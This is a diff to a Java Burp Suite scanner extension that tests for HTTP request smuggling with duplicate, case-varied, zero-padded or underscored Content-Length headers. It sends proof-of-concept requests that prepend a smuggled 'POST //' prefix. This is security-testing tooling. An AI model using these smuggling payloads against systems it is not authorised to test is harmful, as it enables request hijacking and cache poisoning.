@@ -2,27 +2,47 @@ package burp;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.HashMap;
 import java.util.List;
 
 public class DualContentScan extends SmuggleScanBox implements IScannerCheck  {
 
     DualContentScan(String name) {
         super(name);
+        registerPermutation("pad1");
+        registerPermutation("pad2");
     }
 
 
-    byte[] dualContent(byte[] baseReq, int offset1, int offset2) {
+    byte[] dualContent(byte[] baseReq, int offset1, int offset2, HashMap<String, Boolean> config) {
         int contentLength = baseReq.length - Utilities.getBodyStart(baseReq); // Integer.parseInt(Utilities.getHeader(baseReq, "Content-Length"));
 
         String off1 = String.valueOf(contentLength+offset1);
         String off2 = String.valueOf(contentLength+offset2);
-        if (offset1 == offset2) {
-            off2 = "0"+off2;
+        if (off1.equals(off2)) {
+            if (config.containsKey("pad1")) {
+                off1 = "0" + off1;
+            }
+            if (config.containsKey("pad2")) {
+                off2 = "0" + off2;
+            }
         }
 
-        baseReq = Utilities.addOrReplaceHeader(baseReq, "content-Length", off1);
-        baseReq = Utilities.addOrReplaceHeader(baseReq, "content-length", off2);
         baseReq = Utilities.replace(baseReq, "Content-Length".getBytes(), "oldContent-Length".getBytes());
+
+        String name1 = "Content-length";
+        String name2 = "content-length";
+
+        if (config.containsKey("underscore1")) {
+            name1 = name1.replace("-", "_");
+        }
+        if (config.containsKey("underscore2")) {
+            name2 = name2.replace("-", "_");
+        }
+
+        baseReq = Utilities.addOrReplaceHeader(baseReq, name1, off1);
+        baseReq = Utilities.addOrReplaceHeader(baseReq, name2, off2);
+
         return baseReq;
     }
 
@@ -39,21 +59,40 @@ public class DualContentScan extends SmuggleScanBox implements IScannerCheck  {
         IParameter notEmpty = burp.Utilities.helpers.buildParameter("notempty", "1", IParameter.PARAM_BODY);
         baseReq = Utilities.helpers.addParameter(baseReq, notEmpty);
 
-        byte[] noAttack = dualContent(baseReq, 0, 0);
+        if (request(service, baseReq).timedOut()) {
+            return null;
+        }
+
+        // todo move this into SmuggleScanBox
+        HashMap<String, Boolean> config;
+        for (String permutation: supportedPermutations) {
+            if (!Utilities.globalSettings.getBoolean(PERMUTE_PREFIX+permutation)) {
+                continue;
+            }
+            config = new HashMap<>();
+            config.put(permutation, true);
+            attack(baseReq, service, config);
+        }
+
+        return null;
+    }
+
+    void attack(byte[] baseReq, IHttpService service, HashMap<String, Boolean> config) {
+        byte[] noAttack = dualContent(baseReq, 0, 0, config);
 
         Resp baseline = request(service, noAttack);
         if (baseline.timedOut()) {
-            return null;
+            return;
         }
 
-        Resp firstHeader = request(service, dualContent(baseReq, 1, 0));
+        Resp firstHeader = request(service, dualContent(baseReq, 1, 0, config));
         if (firstHeader.getStatus() == baseline.getStatus()) {
-            return null;
+            return;
         }
 
-        Resp secondHeader = request(service, dualContent(baseReq, 0, 1));
+        Resp secondHeader = request(service, dualContent(baseReq, 0, 1, config));
         if (secondHeader.getStatus() == baseline.getStatus()) {
-            return null;
+            return;
         }
 
         // we rely on a timeout because so many servers just reject non-matching CL
@@ -63,7 +102,7 @@ public class DualContentScan extends SmuggleScanBox implements IScannerCheck  {
             if (firstHeader.timedOut()) {
                 report("CL-CL: x-T-T", "X:Y:Y", baseline, firstHeader, secondHeader);
             } else {
-                return null;
+                return;
             }
         } else {
             if (firstHeader.timedOut() || secondHeader.timedOut()) {
@@ -75,18 +114,18 @@ public class DualContentScan extends SmuggleScanBox implements IScannerCheck  {
 
 
         try {
-            byte[] prefix = "GET / HTTP/1.1\r\nFoo: ba".getBytes();
+            byte[] prefix = "POST // HTTP/1.1\r\nFoo: ba".getBytes();
             ByteArrayOutputStream stream = new ByteArrayOutputStream();
             stream.write(baseReq);
             stream.write(prefix);
-            byte[] attack = stream.toByteArray();
-            sendPoc("CL-CL-1", dualContent(attack, 0, -prefix.length), baseReq, service);
-            sendPoc("CL-CL-2", dualContent(attack, -prefix.length, 0), baseReq, service);
+            final byte[] attack = stream.toByteArray();
+            sendPoc("CL-CL-1", dualContent(attack, 0, -prefix.length, config), baseReq, service, config);
+            sendPoc("CL-CL-2", dualContent(attack, -prefix.length, 0, config), baseReq, service, config);
 
         } catch (IOException e) {
 
         }
         BurpExtender.hostsToSkip.put(service.getProtocol()+service.getHost(), true);
-        return null;
+        return;
     }
 }
